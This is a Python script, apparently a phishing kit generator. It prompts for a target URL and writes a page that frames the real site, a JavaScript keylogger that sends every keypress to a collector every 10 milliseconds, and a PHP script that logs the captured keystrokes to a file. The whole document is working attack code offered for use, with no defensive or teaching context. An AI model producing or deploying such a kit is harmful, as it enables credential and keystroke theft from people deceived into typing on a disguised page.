import os , sys , fileinput
###You can change the User Agent here###
UserA="""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"""
S10 = '\033[91m'#yellow
S11 = '\033[94m'#clearblue
S12 = '\033[93m'#pink
def draw():
    print(""" (                         )           """)
    print(""" )\ )   )               ( /(           """)
    print("""(()/(( /(    )    )     )\()) (  (     """)
    print(""" /(_))\())( /(   (    |((_)\ ))\ )\ )  """)
    print("""(_))((_)\ )(_))  )\  '|_ ((_)((_|()/(  """)
    print("""/ __| |(_|(_)_ _((_)) | |/ (_))  )(_)) """)
    print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
    print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
    print("""                                 |__/  """+S11)

def clear(numlines=100):
  print(S10)
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
    draw()
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
    draw()
  else:
    print('\n' * numlines)
    draw()

clear()
target = input(S12+'Target Page > '+S10)
w = open("Phish/java.js", "w")
w.write("""
var buffer = [];
var attacker = 'get.php?c='
document.onkeypress = function(e) {
    buffer.push(e.key);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 10);
""")
w.close()
f = open("Phish/index.html", "w")
f.write("""

<html>
<head>
<script src="java.js"></script>
</head>
<!--
<script language="JavaScript">
if(window != top) {
        top.location.href = location.href;
}
</script>
-->
<frameset rows="*,29">
	<frame src='"""+target+"""' name="redir_frame" frameborder="0">
	<noframes>
	Sorry, your browser does not support this site.
	</noframes>
</frameset>
</html>

""")
f.close()
z = open("Phish/get.php", "w")
z.write("""
<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
""")
z.close()
